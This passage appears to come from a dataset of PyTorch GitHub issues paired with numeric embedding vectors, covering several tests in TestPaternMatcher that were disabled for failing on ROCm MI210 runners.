  1.23983085e-01 -2.37731159e-01 -8.67566019e-02 -2.68412679e-01
 -3.97662699e-01 -5.27387187e-02 -5.03859147e-02 -4.40414064e-02
 -1.04715340e-01  4.55893613e-02  3.89548466e-02 -1.41054600e-01
 -8.74664783e-02  8.37401897e-02  2.14216933e-01 -7.19592422e-02
 -1.10946372e-02 -2.20832795e-01 -1.95094749e-01 -5.10380268e-02
 -4.99232067e-03 -3.87695640e-01 -3.12584728e-01 -5.58319688e-03
  5.64364940e-02  3.87592733e-01 -3.30000579e-01  6.66912496e-02
 -3.76965970e-01  7.11248219e-02  2.27217570e-01 -7.07939789e-02
  1.56329930e-01  2.81003773e-01 -3.34194675e-02  1.79066867e-01
 -2.83488594e-02  1.36407167e-01  2.79625714e-01 -1.23423114e-01
  1.44218653e-01  2.73420393e-01 -2.82669723e-01  4.98326391e-01
  3.74694169e-01  2.77086735e-01 -4.58968401e-01  1.89017713e-01
 -1.94156930e-01 -5.37420288e-02  2.24677771e-01 -4.59199101e-01
  1.27799556e-01  2.99000144e-02  2.75389940e-01 -2.88096517e-01
  3.88264954e-01  1.78485423e-01 -3.71964574e-01  1.36666536e-01
  1.72309935e-01  2.41433203e-01 -1.74759224e-01  2.06520692e-01
  1.34045720e-01 -7.13910609e-02 -2.52300203e-01 -3.72816861e-01
 -1.48694873e-01 -1.55060783e-01  2.64596194e-01  2.08905742e-01
  1.95222527e-01  1.68590307e-01 -1.56561077e-01  1.21006712e-01
  2.19029725e-01 -2.10669637e-03  2.99197823e-01  1.16698727e-01
 -1.59641936e-01  7.97123089e-03 -7.59817660e-02 -2.78157890e-01
 -1.38196591e-02 -2.20724031e-01  1.35848066e-03  2.08458066e-01
  2.88880110e-01 -2.74662018e-01 -2.46640556e-02  1.94218099e-01
  1.60458475e-01  3.98700535e-01  1.11806989e-02 -8.42994153e-02
 -6.22642562e-02  1.80878267e-01 -9.88967791e-02  9.61916596e-02
  2.43594527e-01 -8.48794729e-02 -3.61022532e-01  1.83583677e-01
  3.55335660e-02  2.69771278e-01 -4.30996150e-01 -3.04029197e-01
 -1.80067331e-01  8.13445635e-03  2.04946846e-01 -3.84769529e-01
 -1.95788041e-01  2.29234964e-01  9.81908739e-02 -5.14626615e-02
 -2.19055265e-02  6.64555669e-01  1.96557119e-01 -2.98787057e-01
 -2.09311932e-01  8.89625549e-02 -3.93036380e-02 -1.87569946e-01
 -1.62364975e-01 -7.73244798e-02  2.92158723e-01  3.39567244e-01
 -1.35520518e-01  3.59308690e-01 -5.63987866e-02  1.67171448e-01
  3.47126871e-02  6.56469911e-02  1.16578415e-01  3.91975373e-01
  1.01990089e-01  3.24919224e-01  3.25543463e-01  1.66563898e-01
 -9.14826170e-02  1.29473388e-01 -5.13513565e-01  1.23867288e-01
 -6.95468783e-02 -2.46176869e-01 -1.40791878e-01 -1.24970719e-01
  2.69727975e-01  2.79820859e-01 -3.80793214e-01  3.49165380e-01
 -8.18001777e-02 -1.28225923e-01  3.92134428e-01 -2.31358171e-01
  4.60409284e-01 -7.45452344e-02 -2.33023107e-01  3.35063547e-01
  1.71785504e-01 -1.85489327e-01 -1.18989915e-01  6.99597448e-02]"
DISABLED test_mm_plus_mm (__main__.TestPaternMatcher) module: rocm triaged skipped,"Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/5744430164/job/15572649474

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False,"[ 9.15253609e-02 -3.67325544e-02 -9.57424194e-02 -6.18749037e-02
  5.74783608e-03 -1.52494580e-01  2.75781751e-01  1.26878649e-01
 -5.64570844e-01 -2.77148366e-01  3.17903429e-01 -4.58710283e-01
  1.10999092e-01  4.69702668e-03 -4.62867647e-01 -8.29547197e-02
 -2.18389705e-01 -1.08122841e-01  1.55669391e-01  8.90930146e-02
 -2.71321505e-01 -1.22136809e-01 -4.13396120e-01  9.54948217e-02
 -3.09061706e-01  2.42755383e-01 -2.46057168e-01  2.24632528e-02
 -3.06607783e-01  2.46144861e-01  1.70282796e-01  1.33249745e-01
  6.44040257e-02 -2.76744626e-02  4.48931456e-01 -7.21314102e-02
 -2.74787366e-01 -2.03086928e-01 -2.42880523e-01 -1.25202477e-01
  5.69197498e-02 -1.32358909e-01  2.24276669e-02  1.29824862e-01
 -1.78586528e-01  1.35024294e-01 -1.12057533e-02  4.33031544e-02
 -2.50149462e-02 -7.83259794e-02  2.61452019e-01 -1.93785280e-01
 -1.56313092e-01 -3.80640388e-01 -1.89341921e-02  1.24934770e-01
  2.84041673e-01  3.30862463e-01  1.70212954e-01  3.14902067e-01
  5.65128922e-02 -2.23126654e-02 -1.56884864e-01 -8.10625553e-02
  2.83631217e-02  3.18805814e-01 -1.07447952e-01 -3.79977196e-01
  3.38486016e-01  1.33439243e-01 -1.83994412e-01  6.61985278e-02
  1.45327039e-02  2.42969856e-01  2.13767081e-01  3.99580240e-01
 -3.70046645e-02 -1.07682079e-01 -6.95984811e-04 -2.00948834e-01
 -2.63046622e-01  8.95507634e-04 -3.91391180e-02 -2.30644807e-01
  3.77082616e-01 -2.38821924e-01  6.65716976e-02 -9.62829441e-02
  7.26581812e-02 -9.02253613e-02  1.12886548e-01  1.25461340e-01
  1.00662060e-01  8.08443949e-02  4.79537100e-02 -1.07443612e-02
 -2.13065356e-01 -2.27980260e-02 -4.99046147e-01  2.02856004e-01
  3.05498056e-02  1.05817243e-03 -3.90835315e-01  1.88816652e-01
 -5.24461269e-01 -7.02927113e-02  1.32025063e-01 -2.29837626e-01
 -1.12580761e-01  3.13306540e-01  1.13929696e-01  1.76272867e-03
 -1.03948243e-01  3.76951098e-01  5.32055497e-02  2.75368929e-01
 -1.40716255e-01 -1.85353070e-01  2.52389051e-02  2.74779201e-01
 -2.05397159e-01 -4.26293731e-01  1.57573715e-01 -4.29448001e-02
  7.61426091e-02 -1.74837619e-01 -1.30098546e-02  2.17622519e-01
 -2.85213217e-02  4.72246446e-02 -2.86663920e-02 -4.40644026e-02
  1.00956939e-01  6.67966763e-03 -2.89458811e-01  1.01318359e-01
  8.81224573e-02 -8.17243457e-02  1.01003513e-01  1.99859560e-01
 -2.41861567e-01  1.82967737e-01 -9.61347222e-02 -4.65424918e-02
  2.94923604e-01 -8.85326937e-02 -3.80391419e-01  1.58497959e-01
  6.09176159e-02  9.92444754e-02  1.49962515e-01 -1.21251903e-01
  1.74746513e-01  7.15117633e-01  5.63590415e-03 -8.03416595e-03
  5.50077438e-01  1.09179989e-01 -2.90591449e-01 -1.68525010e-01
 -1.61334440e-01  2.28074901e-02  6.02690279e-02 -1.08866774e-01
  3.40701252e-01 -3.05239223e-02 -4.35342461e-01  1.12558782e-01
  6.94571286e-02  2.29151309e-01  3.02743018e-01  2.46358097e-01
  2.66038865e-01 -3.33652012e-02  1.62574768e-01 -3.53274137e-01
  2.27116436e-01 -1.25117674e-01 -2.54275296e-02 -7.52681941e-02
  1.25037834e-01  2.10522562e-02  4.97807145e-01 -2.63229102e-01
 -3.09381962e-01  1.36952549e-01 -8.77365470e-02  7.20463172e-02
 -1.65417027e-02 -8.30151439e-02 -2.48510778e-01  2.13417187e-01
 -3.04366499e-02 -8.52032676e-02 -3.61198843e-01 -2.61154741e-01
 -5.48486784e-03 -1.70918375e-01  1.45917803e-01  4.07580771e-02
  1.08500518e-01  2.26869643e-01 -1.30733877e-01 -4.13364649e-01
  9.74315703e-02  1.29898474e-01 -9.56676081e-02 -4.52888906e-01
  8.07150975e-02  3.41661185e-01 -5.20115625e-03 -4.24679816e-01
 -1.05423436e-01 -1.62682176e-01 -8.62569641e-03  6.14221767e-02
 -5.51760867e-02 -8.29128250e-02 -3.07963490e-01  6.44407570e-02
 -1.52205927e-02 -8.76996517e-02 -2.07047343e-01 -2.48824269e-01
 -3.33622158e-01 -3.01734321e-02 -3.38136479e-02 -6.10353984e-02
  2.05743574e-02  7.41797686e-02  6.96916133e-02 -8.48109424e-02
 -2.98689231e-02 -3.35998610e-02  2.22051024e-01 -1.15183383e-01
 -1.94565207e-01 -2.88192242e-01 -1.10554863e-02 -4.73855156e-03
 -1.12112910e-01 -3.42246354e-01 -4.22017306e-01 -1.12461504e-02
  1.95897937e-01  4.20912623e-01 -3.96358669e-01  1.48678094e-01
 -3.28085661e-01  4.35238481e-02  7.77901858e-02 -5.19131571e-02
 -7.96324909e-02  3.62864047e-01 -9.81715247e-02  2.24950001e-01
 -1.11462893e-02  1.51570616e-02  1.25429899e-01 -1.61969006e-01
  2.85132021e-01  2.67059118e-01 -2.25399464e-01  5.79909861e-01
  4.38184977e-01  2.85378605e-01 -3.50164026e-01  1.48571730e-01
 -2.17995316e-01 -5.34516722e-02  2.30280370e-01 -4.84274179e-01
  2.77249634e-01 -1.49814384e-02  2.76236296e-01 -1.93491846e-01
  3.49338949e-01  1.41965732e-01 -2.64979124e-01  1.44626275e-01
  1.36473060e-01  7.69113898e-02 -4.56481166e-02  2.65892565e-01
  1.80046052e-01 -1.98526055e-01 -1.57518819e-01 -3.95826876e-01
 -2.14009851e-01 -8.74601156e-02  2.04579949e-01  3.61418962e-01
  1.58893436e-01  1.76564351e-01 -2.54357517e-01  2.71128174e-02
  2.07811117e-01  1.44354060e-01  1.82135448e-01  5.56195527e-03
 -2.22426295e-01  7.65997767e-02  1.86285079e-01 -3.28788549e-01
 -1.14351645e-01 -1.82326704e-01 -7.53004849e-02  2.83129692e-01
  3.37162733e-01 -1.85892791e-01 -1.00349434e-01  5.95256016e-02
  6.15822189e-02  4.57391381e-01  1.23058289e-01  2.79943459e-02
 -1.72283962e-01  2.24111885e-01 -4.12385911e-02  1.13475010e-01
  3.45892489e-01 -1.43453166e-01 -2.37920433e-01  6.29110336e-02
  1.21418238e-01  2.94869602e-01 -4.35445189e-01 -2.81397849e-01
 -7.54680336e-02 -1.05460957e-01  1.82908729e-01 -3.13565910e-01
 -1.81725219e-01  1.88020945e-01  8.81170295e-03 -8.65251124e-02
  1.98033527e-02  6.10321403e-01  1.51728541e-01 -3.51633668e-01
 -2.25097671e-01  1.07434578e-01 -4.19492945e-02 -1.63016111e-01
 -1.38552636e-01 -8.07434320e-02  4.33476210e-01  4.30438668e-01
 -1.93414539e-01  4.55470562e-01  2.66915578e-02  2.23077372e-01
  3.60945314e-02 -3.46292295e-02  2.06669420e-03  3.84069741e-01
  2.22097933e-01  1.86200023e-01  2.42460936e-01  1.75568804e-01
 -1.77043423e-01  5.59765399e-02 -5.31834364e-01  1.23134136e-01
  2.36123390e-02 -1.81650296e-01 -9.55927148e-02 -9.09879804e-02
  2.71822035e-01  2.50438094e-01 -4.01684642e-01  1.94659397e-01
 -7.17509389e-02 -7.65124261e-02  3.93244326e-01 -3.08235615e-01
  4.86781597e-01 -1.48152515e-01 -2.08845794e-01  2.49116689e-01
  1.18731260e-01 -2.87150860e-01 -1.44463569e-01 -3.04857697e-02]"
DISABLED test_mixed_mm_gating (__main__.TestPaternMatcher) module: rocm triaged skipped,"Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/5744430164/job/15572649474

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False,"[-0.00351585 -0.13941255 -0.15354043 -0.02599137  0.00454656 -0.18155862
  0.38948458  0.1073577  -0.50182056 -0.29399753  0.25343305 -0.37340325
  0.13086136  0.04579978 -0.45157292  0.01814359 -0.22925907 -0.12389381
  0.18257555  0.0330045  -0.23084734 -0.16357017 -0.35271484  0.11994283
 -0.34931752  0.23590474 -0.24085435 -0.01803608 -0.35964772  0.22660321
  0.17460753  0.24274647 -0.04029111 -0.09974211  0.3348452  -0.10902491
 -0.30389535 -0.17931587 -0.2735178  -0.15449405  0.11638831 -0.02359898
 -0.00170774  0.03460266 -0.14914566  0.25918165 -0.05569036  0.02542401
 -0.11910424 -0.17061862  0.1995682  -0.15639162 -0.08951135 -0.45599902
  0.0583465   0.06329727  0.24595256  0.24870455  0.07351147  0.3633271
  0.04679058 -0.04119556 -0.11124537  0.00856894  0.00615908  0.24187441
 -0.00515986 -0.3188337   0.3495201   0.08663814 -0.21604359 -0.00915878
 -0.02758934  0.33178192  0.24904636  0.3977771  -0.05092576 -0.07318573
  0.05562477 -0.22059803 -0.20568162 -0.03308211 -0.03827479 -0.30688477
  0.3674773  -0.22275512  0.07836987 -0.08155607  0.0661425  -0.01587715
  0.19318014  0.16768244  0.10632505  0.06795309  0.02472763  0.07147008
 -0.21264456 -0.16276997 -0.5166616   0.15288171 -0.00875663  0.04508762
 -0.3130486   0.226672   -0.45749122 -0.14027922  0.2220542  -0.21076441
 -0.10847303  0.33670676  0.11375451 -0.01534656 -0.04825316  0.27888697
 -0.04235344  0.22972053 -0.16266078 -0.11470948  0.11423844  0.34608096
 -0.24927656 -0.40976295  0.08112943  0.05583426  0.15220973 -0.03502245
  0.01124162  0.20330933  0.02636211 -0.01499132 -0.08647525 -0.03483707
  0.07887258  0.09206389 -0.2939744   0.08209018  0.06099945 -0.02739305
  0.12805504  0.16922674 -0.21345168  0.25743163 -0.04938973  0.01095765
  0.18935433 -0.16726586 -0.3444469   0.07977685  0.02653248  0.07841671
  0.15199712 -0.10946397  0.10809663  0.69117606  0.01780492 -0.10174967
  0.53786933  0.12457752 -0.27319962 -0.09031574 -0.15874073  0.05243403
  0.07045774 -0.16609001  0.35599685 -0.05120249 -0.4569664   0.1209869
  0.11301576  0.1961461   0.30047208  0.23053935  0.1860797  -0.03278965
  0.16962896 -0.25202483  0.22246565 -0.04597327 -0.07768539 -0.09287624
  0.11821819  0.09832032  0.4809054  -0.19458069 -0.26939192  0.16951004
 -0.07386354  0.06800465 -0.11527798 -0.05802429 -0.2884475   0.13791206
  0.07903927 -0.11684115 -0.33085275 -0.22806686  0.00331418 -0.23466402
  0.10545702  0.00330102  0.13317937  0.18927518 -0.10474168 -0.41359192
  0.05150968  0.11709383 -0.09321681 -0.4435936   0.12948035  0.35444066
  0.02995996 -0.3940999  -0.18014403 -0.19452778 -0.05478985  0.09511001
  0.00887953 -0.034214   -0.18814516  0.07677279  0.05502987 -0.05265085
 -0.19452906 -0.28042388 -0.3615809  -0.00232913  0.06622946  0.03764042
 -0.01689917  0.00165909  0.07035047 -0.15381947  0.05087897  0.01213937
  0.16208228 -0.15497707 -0.12575181 -0.23901205  0.02179017 -0.06366886
 -0.17060274 -0.3652611  -0.29542285 -0.10020875  0.19903474  0.45684612
 -0.3442325   0.09918367 -0.279679    0.02838862  0.13743785 -0.01557699
 -0.07925395  0.38982612 -0.03669108  0.2365812  -0.02436506 -0.04329783
  0.16964087 -0.24107777  0.3762866   0.34968522 -0.29850858  0.5579955
  0.41740716  0.28389114 -0.41083786  0.1516156  -0.14863795 -0.05386049
  0.11420847 -0.45428845  0.28513342  0.02946642  0.24186216 -0.22457594
  0.30832005  0.09466936 -0.27653277  0.05390649  0.20929317  0.0617713
 -0.06523401  0.22658476  0.2331923  -0.20405817 -0.16268745 -0.460485
 -0.20362653 -0.04125758  0.2394082   0.3414676   0.16420382  0.22558683
 -0.30480933 -0.00878895  0.23390862 -0.02118289  0.27034107  0.06598757
 -0.21550778  0.05705636  0.137809   -0.32429746 -0.08343729 -0.15277174
 -0.09604302  0.3150945   0.2891671  -0.10863283 -0.11945488  0.10075451
  0.14537062  0.3628896   0.03586099  0.01728152 -0.17440632  0.25424185
 -0.04366262  0.10499227  0.3498577  -0.10742933 -0.22152102  0.1140117
  0.17004228  0.30106395 -0.43279833 -0.26172864 -0.11947356 -0.09738576
  0.14331104 -0.2671154  -0.19137377  0.21740872  0.16535345 -0.16845521
  0.00338801  0.6352384   0.12573893 -0.33791557 -0.24832013  0.11334723
 -0.01240873 -0.11353055 -0.17357115 -0.11109198  0.45628175  0.40870768
 -0.19518086  0.39868382 -0.06552799  0.18916962  0.05866513  0.06178674
 -0.09479615  0.37145582  0.16019118  0.23286742  0.2606455   0.1723789
 -0.21927509  0.02702306 -0.4963562   0.11591189  0.04626226 -0.17626762
 -0.10046979 -0.14233398  0.24483722  0.3122517  -0.3695259   0.1770472
 -0.0544214  -0.07925507  0.3842702  -0.39553148  0.43004164 -0.18278286
 -0.22316712  0.25634354 -0.03973642 -0.23209754 -0.17172241  0.03680579]"
DISABLED test_mixed_mm_epi_works (__main__.TestPaternMatcher) module: rocm triaged skipped,"Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/5744430164/job/15572649474

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False,"[ 8.11865181e-02 -6.51473925e-02 -9.86792222e-02 -8.86227190e-03
  1.25691235e-01 -2.88407028e-01  3.11427891e-01  3.38856354e-02
 -5.31033158e-01 -3.07583034e-01  2.86691964e-01 -4.37720537e-01
  2.21457463e-02 -4.40081349e-04 -4.30368006e-01 -1.36111468e-01
 -6.00222945e-02 -8.21336955e-02  2.02747792e-01  1.21193394e-01
 -2.16459811e-01 -1.96796924e-01 -2.90418029e-01  8.36517736e-02
 -3.73656750e-01  3.43796879e-01 -1.50291264e-01  2.47693099e-02
 -3.32556129e-01  1.39133215e-01  2.82024950e-01  7.65725672e-02
  5.66327460e-02 -1.20962545e-01  3.58074844e-01 -5.84029146e-02
 -2.27033198e-01 -2.65305161e-01 -2.11028486e-01 -2.02433169e-01
  1.29429698e-01 -1.31627284e-02  4.76975739e-02  9.39642489e-02
 -1.92962989e-01  1.23658419e-01 -1.21556111e-02 -5.36129512e-02
 -2.03670897e-02 -2.00261906e-01  2.57645905e-01 -1.32196873e-01
 -5.72766736e-02 -4.89792943e-01 -2.49537192e-02  8.76743346e-02
  2.01990038e-01  3.65972847e-01  9.78110265e-03  3.32216144e-01
  3.02328337e-02 -1.02808084e-02 -1.75714090e-01 -3.27855125e-02
  1.05451178e-02  2.94392377e-01 -9.46321562e-02 -3.55580300e-01
  2.88292944e-01 -3.15578654e-02 -1.96724176e-01  8.09617043e-02
 -6.96147084e-02  2.46182650e-01  2.37302959e-01  5.11556804e-01
 -1.68822944e-01 -2.11083926e-02 -1.01023102e-02 -1.62675500e-01
 -1.51733354e-01 -1.01548851e-01 -9.04050395e-02 -2.23996341e-01
  3.27431738e-01 -9.39850658e-02  6.48849532e-02 -3.45118754e-02
  8.24985877e-02 -8.92733783e-02  2.60926783e-01  1.80382997e-01
  5.87235913e-02  1.36684716e-01  1.18843280e-01  8.33307877e-02
 -1.85370684e-01 -9.36160982e-02 -4.54433948e-01  1.99752063e-01
 -4.57752831e-02  1.92704368e-02 -3.90830040e-01  2.88778812e-01
 -5.47233701e-01 -1.77457318e-01  1.50413170e-01 -2.13275015e-01
 -1.16298132e-01  2.17657238e-01  1.59197778e-01 -9.87338424e-02
 -7.63398185e-02  3.86461794e-01  7.41498172e-02  2.51520723e-01
 -1.40379354e-01 -1.38908684e-01  6.40828460e-02  2.81215429e-01
 -2.45509595e-01 -3.97414804e-01  1.10073373e-01 -4.92728315e-04
  1.01545818e-01 -1.59020573e-01  4.61189672e-02  2.31426939e-01
 -5.02186194e-02  2.85673700e-03 -2.78262403e-02 -5.84842302e-02
  1.64705649e-01  2.73888931e-02 -2.00905815e-01  3.35028581e-03
  9.84910876e-02 -2.03801125e-01  1.05128027e-01  2.77715713e-01
 -1.49934560e-01  2.55715311e-01 -7.33634084e-02 -2.12037116e-02
  2.28088796e-01 -3.39810327e-02 -2.70145893e-01  9.85855609e-02
  6.92754090e-02  1.29779756e-01  1.00209355e-01 -1.88941807e-01
  1.05205268e-01  7.36245394e-01  1.22708706e-02 -2.75675543e-02
  5.86024880e-01  1.21762797e-01 -2.94202715e-01 -1.19287640e-01
 -2.20626622e-01  8.86097550e-02  2.66002528e-02 -1.58104263e-02
  2.16375440e-01 -1.39255542e-02 -4.82500285e-01  1.61704179e-02
 -2.66520567e-02  2.08518893e-01  1.16532616e-01  1.99915126e-01
  2.56442904e-01 -2.16715336e-01  1.36813313e-01 -2.67255962e-01
  2.73293406e-01 -1.36274369e-02 -4.76783551e-02 -6.66725710e-02
  1.14465065e-01 -1.13753118e-02  3.58682394e-01 -1.75427437e-01
 -1.31353289e-01  2.53739536e-01 -4.78153005e-02  1.29724249e-01
 -6.42736778e-02  1.00236759e-02 -3.40681136e-01  1.57370821e-01
 -3.79195847e-02 -5.39069623e-02 -2.61655629e-01 -1.63761720e-01
  1.17672216e-02 -9.94177461e-02  7.57530183e-02 -2.40672715e-02
  1.38123125e-01  2.46566027e-01 -1.17459156e-01 -3.41327727e-01
  3.71249951e-03  1.18882306e-01 -1.73196897e-01 -4.31422651e-01
  7.38360807e-02  3.01434666e-01 -4.78184372e-02 -4.36586142e-01
 -1.83864653e-01 -6.02733009e-02 -1.14604145e-01  1.56315878e-01
 -1.52327809e-02 -7.56582804e-03 -2.21215487e-01  1.09040469e-01
  2.04484463e-02  8.04432295e-03 -1.85392037e-01 -2.62074918e-01
 -2.13679999e-01 -9.98223424e-02 -1.58188697e-02 -3.88525426e-03
  5.91325276e-02  1.10423982e-01  8.89235586e-02 -1.06783852e-01
  6.71491623e-02  2.93493196e-02  2.08941668e-01 -1.29335016e-01
 -1.02709711e-01 -2.67637908e-01 -9.32494923e-02 -9.01657641e-02
 -1.77835673e-01 -3.70922744e-01 -2.83919990e-01 -8.65012873e-03
  1.55368686e-01  4.68024462e-01 -2.86031663e-01  1.33007959e-01
 -3.83657992e-01  3.83735150e-02  1.01222657e-01 -1.20136723e-01
 -6.50114641e-02  3.02402198e-01 -4.04545404e-02  2.04375297e-01
 -7.06029031e-03  1.76169649e-02  1.86897561e-01 -2.08872661e-01
  3.42113495e-01  3.69719565e-01 -2.04241335e-01  5.04498005e-01
  3.76332164e-01  2.98035294e-01 -4.13977891e-01  7.80442134e-02
 -1.53258815e-01 -5.80080897e-02  1.29992649e-01 -4.64813709e-01
  2.89276749e-01  6.79142587e-03  2.79536992e-01 -1.77068144e-01
  3.54373336e-01  2.03132406e-02 -2.29804114e-01  7.99312592e-02
  2.13561028e-01  3.54324915e-02 -1.34018600e-01  2.70980567e-01
  2.35347807e-01 -1.75313905e-01 -1.13478415e-01 -3.30831468e-01
 -2.67472833e-01 -1.32926375e-01  1.99794233e-01  2.29665190e-01
  1.65501103e-01  2.34829783e-01 -2.94914901e-01 -5.03126383e-02
  2.88869351e-01  6.54121116e-02  2.98327327e-01  8.70652795e-02
 -2.64199495e-01  1.43016782e-02  1.21066436e-01 -2.95042872e-01
 -1.47583932e-01 -1.50113180e-01 -1.85299918e-01  2.42099598e-01
  3.00689787e-01 -1.67097613e-01 -1.11541152e-01  1.57743603e-01
  1.38271809e-01  4.42506433e-01  5.89234233e-02  7.80970380e-02
 -1.04857922e-01  3.22463989e-01 -4.19619232e-02  6.22981042e-02
  2.95898825e-01 -1.77042991e-01 -2.18661621e-01  1.15899764e-01
  3.76917273e-02  2.13519841e-01 -4.66894984e-01 -2.75823683e-01
 -7.07611293e-02 -1.74487889e-01  1.45507470e-01 -3.26967239e-01
 -1.94241166e-01  2.81789482e-01  9.52830613e-02 -8.14467743e-02
  2.80895866e-02  5.20137012e-01  1.80117324e-01 -4.33669329e-01
 -2.12228522e-01 -1.03975758e-02  3.45122665e-02 -1.98713005e-01
 -6.28984123e-02 -4.83359136e-02  4.26800966e-01  3.62335443e-01
 -2.64783263e-01  4.30541307e-01  4.15273346e-02  1.47996217e-01
  8.71155225e-03  5.47214672e-02 -7.05343559e-02  3.76145631e-01
  3.12226743e-01  2.48593062e-01  1.80695519e-01  2.66163260e-01
 -1.72700495e-01 -1.82531960e-03 -4.99852657e-01  1.59547925e-02
  1.12539262e-01 -1.05014920e-01 -1.33718982e-01 -4.35430966e-02
  2.13662639e-01  2.97749370e-01 -3.73979092e-01  1.03497252e-01
 -1.47176594e-01 -9.75708589e-02  4.72355574e-01 -2.65066922e-01
  3.74903560e-01 -1.93524227e-01 -1.55808553e-01  3.08243334e-01
  1.39916345e-01 -2.40723222e-01 -1.30023897e-01  6.14839233e-02]"
DISABLED test_mixed_mm (__main__.TestPaternMatcher) module: rocm triaged skipped,"Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/5744430164/job/15572649474

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False,"[ 0.07042268 -0.06033948 -0.10291143 -0.06595468  0.03479636 -0.19030777
  0.29096     0.1247091  -0.57718897 -0.28449714  0.26853216 -0.48641258
  0.08892296  0.04444021 -0.40334255 -0.1119517  -0.16194423 -0.09593312
  0.19230899  0.13806394 -0.31514686 -0.16437528 -0.36974     0.09434348
 -0.33459106  0.24246204 -0.26856676  0.04308425 -0.32167083  0.22677603
  0.16179687  0.13041115  0.04354837 -0.07551676  0.3849897  -0.02560594
 -0.3072346  -0.23769012 -0.26264277 -0.11474423  0.06611255 -0.07238072
  0.00838105  0.0953759  -0.20962906  0.15473339 -0.03983626  0.03280303
 -0.02619824 -0.10733756  0.21883507 -0.13841598 -0.12415507 -0.4337489
  0.02244101  0.10618638  0.24990132  0.3459625   0.11708191  0.28776032
  0.04461595 -0.01992261 -0.12764047 -0.06304696  0.05929458  0.2779364
 -0.0884976  -0.3681466   0.35797423 -0.01268473 -0.17568132  0.04969256
 -0.05436807  0.23408376  0.21834837  0.41948417 -0.05609594 -0.05709848
 -0.01969322 -0.22049299 -0.24086943 -0.05239184 -0.06210569 -0.23235604
  0.36737785 -0.18181193  0.08661608 -0.10921955  0.05690967 -0.10467339
  0.17960492  0.19101542  0.09527958  0.06890588  0.07289808  0.07795119
 -0.16560696 -0.04181662 -0.45824635  0.23965429  0.03573482 -0.02498526
 -0.3569598   0.2566734  -0.52503484 -0.1050838   0.13708866 -0.24875277
 -0.11736602  0.25042677  0.14079933 -0.01482218 -0.05682968  0.3393109
  0.00368265  0.22903895 -0.14203656 -0.12331054  0.07300399  0.32216942
 -0.20687914 -0.43768364  0.13716625 -0.00187603  0.16123042 -0.14532971
  0.02442687  0.22741556 -0.05502912 -0.00362651 -0.02323636 -0.07151463
  0.09587348  0.00563443 -0.30404234  0.09073048  0.09478117 -0.11839023
  0.11776927  0.20154098 -0.22096051  0.18580583 -0.06513416 -0.05803688
  0.23162918 -0.09346513 -0.3863828   0.18549559  0.04409408  0.16394058
  0.1523363  -0.12584066  0.20220803  0.69103885 -0.00198187 -0.02486026
  0.5308436   0.1418806  -0.28684992 -0.17044374 -0.17267385  0.05820213
  0.01184575 -0.13867983  0.26567963 -0.03097426 -0.48170996  0.07465184
  0.02040572  0.18506329  0.2519104   0.20610556  0.26247472 -0.09710952
  0.10902931 -0.28042278  0.22026727 -0.06353104 -0.00224846 -0.06069611
  0.1202126   0.06576645  0.47996566 -0.2112565  -0.24459499  0.20736349
 -0.0963485   0.11101801 -0.07279885 -0.06568768 -0.29021743  0.14980842
  0.01588139 -0.0516355  -0.34788504 -0.2509623   0.02956127 -0.16576272
  0.15567233  0.05192969  0.0610277   0.22875838 -0.05605801 -0.40733752
  0.06339844  0.1183749  -0.08360638 -0.5225581   0.10248972  0.3456073
 -0.03872428 -0.42833352 -0.17618912 -0.14038953 -0.02883956  0.05320337
 -0.04204681 -0.08587441 -0.2947582   0.07863344 -0.03109743 -0.08980782
 -0.18642387 -0.24385644 -0.35190868  0.01778513 -0.01590015 -0.00978039
  0.02039955  0.06064916  0.07063799 -0.11760759  0.00487381  0.01694332
  0.26478046 -0.12178578 -0.13830493 -0.23275802 -0.04008734  0.00463259
 -0.10002764 -0.37648407 -0.39995363  0.00725101  0.20407665  0.47717175
 -0.36355275  0.1173037  -0.34784514 -0.03010087  0.10306478 -0.05030562
 -0.07407052  0.35089353 -0.04651356  0.24253954 -0.02567623 -0.00174479
  0.17643496 -0.16681628  0.2936316   0.28599223 -0.2052494   0.56208473
  0.45076823  0.2768864  -0.36789623  0.16027755 -0.1995785  -0.08097219
  0.16494495 -0.4722157   0.27661002 -0.03679824  0.27458468 -0.18868819
  0.35745037  0.14111629 -0.27449545  0.1477271   0.14738777  0.07625198
 -0.04914445  0.2704716   0.18505967 -0.19156186 -0.19051155 -0.34916925
 -0.20234063 -0.10737572  0.14933322  0.35363498  0.14060318  0.19340381
 -0.28681415 -0.01798262  0.23611458  0.08877256  0.21981917  0.0575924
 -0.18214086  0.06209555  0.16809061 -0.27132398 -0.09924249 -0.14124672
 -0.07002539  0.2546685   0.32384312 -0.1542466  -0.10249117  0.05560301
  0.05676853  0.440255    0.09656861  0.0226263  -0.10522413  0.24789855
 -0.03647533  0.14008813  0.35075298 -0.14528981 -0.22173274  0.1026006
  0.15538517  0.28307295 -0.48816615 -0.30854547 -0.0964573  -0.05457594
  0.16826002 -0.34504035 -0.20272693  0.17389078  0.11033756 -0.09263811
 -0.01951554  0.5928345   0.1680364  -0.36832157 -0.2087734   0.00585674
 -0.00928938 -0.13774166 -0.12171084 -0.10267418  0.42230234  0.35744363
 -0.19354782  0.44299296  0.01168362  0.21929112  0.02272457 -0.01197232
  0.00393519  0.40710315  0.22139508  0.25062054  0.24839093  0.16713466
 -0.18566969  0.06556791 -0.5447983   0.06584325  0.0875572  -0.17974982
 -0.14014494 -0.11809293  0.26093763  0.25622013 -0.38248152  0.18741351
 -0.10195339 -0.06830933  0.40938306 -0.27353704  0.41878936 -0.15595704
 -0.22715336  0.22510126  0.06362578 -0.21214311 -0.16195993  0.01921365]"
